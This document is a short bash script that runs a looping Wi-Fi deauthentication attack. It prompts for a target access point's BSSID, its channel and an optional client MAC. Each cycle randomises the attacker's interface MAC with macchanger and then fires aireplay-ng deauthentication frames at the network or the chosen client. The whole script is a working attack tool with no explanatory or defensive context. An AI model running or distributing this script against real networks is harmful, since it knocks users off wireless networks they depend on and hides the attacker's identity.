#!/bin/bash
clear
echo -e -n "\e[92mEnter the BSSID : "
read bssid
echo -e -n "\e[93mEnter the Channel : "
read ch
echo -e -n "\e[93mEnter the Client MAC : "
read mac_cli
printf "\n"

while true; do
  trap ctrl_c INT

  function ctrl_c() {
        printf "\nExiting in secs..\n"
        sleep 2
        exit
   }
  printf "\n"
  echo -e -n "\e[0m"
  echo "-----------------------------------------"
  echo -e -n "\e[91m"
  macchanger -s wlan1 | grep "Current MAC"
  echo -e -n "\e[97m"
  echo "-----------------------------------------"
  echo -e -n "\e[5m"
  echo "MAC Address changed..."
  echo -e -n "\e[0m"
  echo "-----------------------------------------"
  ifconfig wlan1 down
  echo -e -n "\e[36m"
  macchanger -r wlan1 | grep "New MAC"
  echo -e -n "\e[97m"
  ifconfig wlan1 up
  echo "-----------------------------------------"
  printf "\n\n"
  iwconfig wlan1 channel $ch
  echo -e -n "\e[95m"
  if [[ "$mac_cli" == "0" ]]
  then
     aireplay-ng -0 5 -a $bssid wlan1
  else
     aireplay-ng -0 5 -a $bssid -c $mac_cli wlan1
  fi     
  sleep 3
done  


